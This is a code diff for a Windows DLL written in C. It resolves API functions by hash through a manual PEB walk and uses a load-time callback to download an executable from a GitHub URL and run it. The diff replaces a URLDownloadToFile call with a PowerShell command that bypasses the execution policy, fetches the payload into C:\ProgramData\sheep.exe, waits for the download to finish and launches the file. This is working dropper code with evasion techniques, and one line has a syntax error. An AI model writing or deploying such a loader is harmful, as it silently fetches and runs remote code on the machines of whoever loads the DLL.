@@ -50,11 +50,12 @@ typedef struct FULL_LDR_DATA_TABLE_ENTRY
      LIST_ENTRY StaticLinks;
 } FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;
 
-typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
+//typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
 typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
 typedef BOOL (* CreateProcessAHeader)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD,
                                       LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
-typedef HRESULT (__stdcall *URLDownloadToFileHeader)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
+typedef DWORD (* WaitForSingleObjectHeader)(HANDLE, DWORD);
+//typedef HRESULT (__stdcall *URLDownloadToFileHeader)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
 
 uint32_t fnv321a(const char *string)
 {
@@ -103,31 +104,34 @@ void NTAPI callback(PVOID dllHandle, DWORD reason, PVOID reserved)
    PFULL_PEB_LDR_DATA ldr = ((PFULL_PEB_LDR_DATA)peb->Ldr);
    PFULL_LDR_DATA_TABLE_ENTRY list_entry = ((PFULL_LDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink);
    PFULL_LDR_DATA_TABLE_ENTRY kernel32 = ((PFULL_LDR_DATA_TABLE_ENTRY)(((PFULL_LDR_DATA_TABLE_ENTRY)list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink));
-   LoadLibraryAHeader loadLibrary = ((LoadLibraryAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x53b2070f));
+   //LoadLibraryAHeader loadLibrary = ((LoadLibraryAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x53b2070f));
    GetFileAttributesAHeader getFileAttributes = ((GetFileAttributesAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0xda1a7563));
    CreateProcessAHeader createProcess = ((CreateProcessAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x4a7c0a09));
-   PIMAGE_DOS_HEADER urlmonModule = ((PIMAGE_DOS_HEADER)loadLibrary("urlmon.dll"));
-   URLDownloadToFileHeader urlDownloadToFile = ((URLDownloadToFileHeader)get_proc_by_hash(urlmonModule, 0xd8d746fc));
+   WaitForSingleObjectHeader waitForSingleObject = ((WaitForSingleObjectHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x71948ca4);
    char sheep[] = "C:\\ProgramData\\sheep.exe";
    STARTUPINFO startup_info;
    PROCESS_INFORMATION proc_info;
 
    if (reason != DLL_PROCESS_ATTACH)
       return;
-   
-   if (getFileAttributes(sheep) == INVALID_FILE_ATTRIBUTES)
-   {
-      if (urlDownloadToFile(NULL,
-                            "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",
-                            sheep,
-                            0,
-                            NULL) != 0)
-         return;
-   }
 
    memset(&startup_info, 0, sizeof(STARTUPINFO));
    memset(&proc_info, 0, sizeof(PROCESS_INFORMATION));
    startup_info.cb = sizeof(STARTUPINFO);
+   
+   if (getFileAttributes(sheep) == INVALID_FILE_ATTRIBUTES)
+   {
+      if (!createProcess(NULL, "powershell -ExecutionPolicy bypass -Command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:/ProgramData/sheep.exe')\"", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info))
+         return;
+
+      if (waitForSingleObject(proc_info.hProcess, INFINITE) != WAIT_OBJECT_0)
+         return;
+
+      memset(&startup_info, 0, sizeof(STARTUPINFO));
+      memset(&proc_info, 0, sizeof(PROCESS_INFORMATION));
+      startup_info.cb = sizeof(STARTUPINFO);
+   }
+
    createProcess(NULL, sheep, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info);
 }
 
